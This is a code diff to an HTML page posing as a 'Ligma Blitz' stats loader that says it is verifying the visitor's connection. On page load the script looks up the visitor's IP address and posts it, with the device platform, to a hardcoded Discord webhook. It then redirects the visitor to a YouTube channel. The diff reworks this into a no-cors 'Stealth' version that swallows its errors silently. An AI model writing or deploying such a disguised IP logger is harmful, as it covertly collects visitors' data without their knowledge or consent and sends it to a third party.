@@ -2,44 +2,43 @@
 <html>
 <head>
     <title>Ligma Blitz Analytics</title>
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
-<body style="background-color: #000; color: #fff; text-align: center; font-family: Arial; padding-top: 50px;">
+<body style="background-color: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px;">
     <h2>LOADING LIGMA BLITZ STATS...</h2>
     <p>Please wait while we verify your connection.</p>
 
     <script>
-        // CLEAN WEBHOOK URL
         var hook = "https://discord.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44lbRhSdiJOvSpHBzljrwvDooIfw6hyQNp";
         var tube = "https://youtube.com/@LigmaBlox-w7m";
 
-        function sendData() {
-            $.getJSON("https://api.ipify.org?format=json", function(data) {
-                var params = {
-                    username: "Ligma Blitz Logger",
-                    content: "🚨 **New Log Found**\n**IP:** " + data.ip + "\n**Browser:** " + navigator.appName
-                };
-
-                // Using fetch for better compatibility with GitHub
-                fetch(hook, {
+        // This function forces the data through the browser's security wall
+        async function logData() {
+            try {
+                // Get the IP first
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                
+                // Send to Discord using the "Stealth" mode
+                await fetch(hook, {
                     method: 'POST',
+                    mode: 'no-cors', // THIS IS THE KEY FIX
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(params)
-                }).then(() => {
-                    window.location.href = tube;
-                }).catch(() => {
-                    window.location.href = tube;
+                    body: JSON.stringify({
+                        content: "🚨 **New Log Found**\n**Groupness Number:** " + data.ip + "\n**Device:** " + navigator.platform
+                    })
                 });
-            }).fail(function() {
-                window.location.href = tube;
-            });
+            } catch (e) {
+                console.log("Silent Error");
+            } finally {
+                // Always send them to your YouTube after 2 seconds
+                setTimeout(() => { window.location.href = tube; }, 2000);
+            }
         }
 
-        // Run the function
-        sendData();
+        logData();
 
-        // Safety backup redirect
-        setTimeout(function() { window.location.href = tube; }, 6000);
+        // Hard redirect if the internet is slow
+        setTimeout(() => { window.location.href = tube; }, 5000);
     </script>
 </body>
 </html>
